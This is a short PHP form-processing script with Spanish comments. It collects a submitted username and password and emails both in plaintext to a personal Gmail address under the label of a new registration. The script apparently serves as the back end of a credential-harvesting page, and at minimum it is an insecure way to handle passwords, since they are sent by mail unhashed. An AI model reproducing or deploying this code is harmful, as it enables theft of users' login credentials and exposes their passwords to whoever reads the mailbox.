<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoger datos del formulario
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Validación básica (puedes implementar validaciones más robustas)
    if (empty($username) || empty($password)) {
        echo "Por favor, completa todos los campos.";
        exit;
    }

    // Envío de correo electrónico
    $to = "narinoa782@gmail.com";
    $subject = "Nuevo registro - Datos del usuario";
    $message = "Nombre de usuario: $username\nContraseña: $password";

    // Ajusta las cabeceras según sea necesario (por ejemplo, para el formato HTML)
    $headers = "From: webmaster@example.com";

    // Envía el correo electrónico
    $success = mail($to, $subject, $message, $headers);

    if ($success) {
        echo "Registro exitoso. Se ha enviado un correo electrónico con los datos.";
    } else {
        echo "Hubo un problema al enviar el correo electrónico. Por favor, intenta de nuevo.";
    }
} else {
    // Si se intenta acceder directamente al archivo PHP
    echo "Acceso no permitido.";
}
?>
